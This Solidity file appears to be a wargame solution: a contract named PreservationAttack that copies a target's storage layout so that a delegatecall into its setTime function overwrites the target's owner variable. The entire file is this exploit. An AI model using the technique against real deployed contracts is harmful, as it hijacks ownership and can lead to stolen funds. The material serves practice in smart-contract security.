// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    address addressOne;
    address addressTwo;
    address owner;

    function setTime(uint256 _time) external {
        owner = address(_time);
    }
}
